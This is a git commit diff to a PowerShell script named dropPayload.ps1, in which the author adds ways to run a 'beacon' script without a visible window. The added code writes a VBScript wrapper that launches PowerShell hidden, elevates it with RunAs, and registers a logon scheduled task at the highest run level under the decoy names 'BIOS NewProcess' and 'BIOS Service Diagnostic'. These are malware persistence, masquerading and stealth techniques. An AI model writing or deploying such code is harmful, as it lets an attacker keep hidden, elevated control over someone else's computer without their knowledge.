084cec70f24d96db5301c666936b09bdbda6145c
currone <94299594+snackmasta@users.noreply.github.com>
2024-02-08 08:34:13 +0700

    no window

--- side-project/dropPayload.ps1
+++ side-project/dropPayload.ps1
@@ -1,13 +1,23 @@
 Unregister-ScheduledTask -TaskName "BIOS Utility" -Confirm:$false
 Unregister-ScheduledTask -TaskName "BLACK FRIDAY Task (One-Time)" -Confirm:$false
 
+# PowerShell script
 $script = @"
-Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -ArgumentList '-command "& {C:\temp\beacon\elevate\GetState.ps1}"' -PassThru | Out-Null
+C:\temp\beacon\elevate\GetState.ps1
 "@
 $script | Out-File -FilePath "C:\temp\NewProcess.ps1" -Encoding ascii
-C:\temp\NewProcess.ps1
 
-$scriptPath = "C:\temp\NewProcess.ps1"
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File `"$scriptPath`""
+# VBScript wrapper
+$vbscript = @"
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell.exe -WindowStyle Hidden -File C:\temp\NewProcess.ps1", 0
+"@
+$vbscript | Out-File -FilePath "C:\temp\RunHidden.vbs" -Encoding ascii
+
+# Execute the VBScript
+Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -Command `"Start-Process 'C:\temp\RunHidden.vbs' -WindowStyle Hidden -Verb RunAs`""
+
+# Register Scheduled Task to run VBScript at logon with elevated privileges
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command `"Start-Process 'C:\temp\RunHidden.vbs' -WindowStyle Hidden -Verb RunAs`""
 $trigger = New-ScheduledTaskTrigger -AtLogon
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "BIOS NewProcess" -Description "BIOS Service Diagnostic" -RunLevel Highest -Force
